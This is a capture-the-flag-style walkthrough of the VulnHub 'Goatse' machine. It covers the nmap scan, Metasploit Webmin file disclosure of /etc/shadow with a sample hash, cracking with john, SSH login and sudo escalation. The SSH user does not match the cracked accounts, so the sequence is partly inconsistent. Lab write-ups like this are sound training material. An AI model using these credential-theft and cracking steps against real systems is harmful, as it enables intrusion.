# Goatse Walkthrough - VulnHub

This is a comprehensive walkthrough of the "Goatse" VulnHub machine. The guide is designed to help users explore vulnerabilities, exploit them, and gain root access. It serves as an educational resource for learning penetration testing techniques.

---

## Description

**Goatse** is an intermediate-level VulnHub machine that challenges users with tasks ranging from reconnaissance and enumeration to exploitation and privilege escalation. This guide details the steps to achieve root access.

---

## Requirements

- Virtualization software (e.g., VirtualBox, VMware)
- A penetration testing OS (e.g., Kali Linux)
- Basic knowledge of Linux commands
- Networking tools: `nmap`, `netcat`, `gobuster`, etc.

---

## Initial Setup

1. Download the Goatse VM from [VulnHub](https://www.vulnhub.com/).
2. Import the VM into your virtualization software.
3. Ensure the VM is on the same network as your attacking machine.
4. Boot the VM and determine its IP address using tools like `netdiscover`.

---

## Step 1: Reconnaissance

### Identify the Target IP

Discover the target's IP address using `nmap`:

```bash
nmap 192.168.48.1/24 -sV
```

Example output:

```plaintext
Nmap scan report for 192.168.48.160
Host is up (0.0016s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp
22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)
25/tcp    open  smtp?
53/tcp    open  domain      ISC BIND 8.2.2-REL
80/tcp    open  http        Apache httpd 1.3.31 ((Unix))
587/tcp   open  submission?
631/tcp   open  ipp         CUPS 1.1
3306/tcp  open  mysql       MySQL (unauthorized)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
```

---

## Step 2: Enumeration

### Vulnerability Discovery

The `nmap` scan reveals a service running on port 10000 (Webmin). Search for exploits using `searchsploit`:

```bash
searchsploit webmin
```

Example output:

```plaintext
Webmin 1.920 - Remote Code Execution
Webmin < 1.290 - Arbitrary File Disclosure
Webmin 1.580 - Remote Command Execution (Metasploit)
```

---

## Step 3: Exploitation

### Using Metasploit

Launch Metasploit and search for Webmin exploits:

```bash
msfconsole
search webmin
```

Select and configure an exploit module:

```bash
use exploit/linux/http/webmin_file_disclosure
set rhosts 192.168.48.160
set rpath /etc/shadow
run
```

Example output:

```plaintext
[*] Running module against 192.168.48.160
[*] Attempting to retrieve /etc/shadow...
root:$1$k6V/lmUF$n2iBfemYg/IsVRyjqopr3.
...
```

---

## Step 4: Cracking Password Hashes

Save the retrieved hashes to a file and use `john` to crack them:

```bash
john --wordlist=/path/to/rockyou.txt hashes.txt
```

Example cracked passwords:

```plaintext
root:password123
guest:guest123
```

---

## Step 5: Privilege Escalation

### SSH Access

Use the cracked credentials to log in via SSH:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa goatse@192.168.48.160
```

After gaining access, escalate to root using `sudo`:

```bash
sudo su
```

---

## Conclusion

This walkthrough illustrates the process of exploiting the Goatse VM, from reconnaissance to achieving root access. Key takeaways include using tools like `nmap`, `searchsploit`, Metasploit, and `john` for effective penetration testing.

---

**Disclaimer:** This guide is for educational purposes only. Do not test systems without explicit authorization.

